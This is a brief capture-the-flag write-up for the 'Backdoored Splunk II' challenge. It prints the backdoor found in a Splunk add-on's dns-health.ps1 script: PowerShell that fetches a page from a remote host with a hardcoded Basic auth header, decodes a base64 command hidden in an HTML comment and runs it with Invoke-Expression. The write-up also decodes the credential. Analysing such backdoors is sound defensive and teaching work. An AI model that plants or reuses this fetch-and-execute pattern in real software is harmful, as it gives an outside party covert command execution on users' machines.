# Backdoored Splunk II

The backdoored file is `dns-health.ps1`. This is a Splunk Add-On running on Windows - the service (part of the challenge),
is accessed and HTML/base64 comments are Invoked in Powershell on Windows.

Payload is:

```powershell
# $PORT below is dynamic to the running service of the `Start` button
@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})
```

Authorization header is `backdoor:this_is_the_http_server_secret`.

No payload is needed - once the challenge service is accessed with that Authorization header a flag is given in base64.
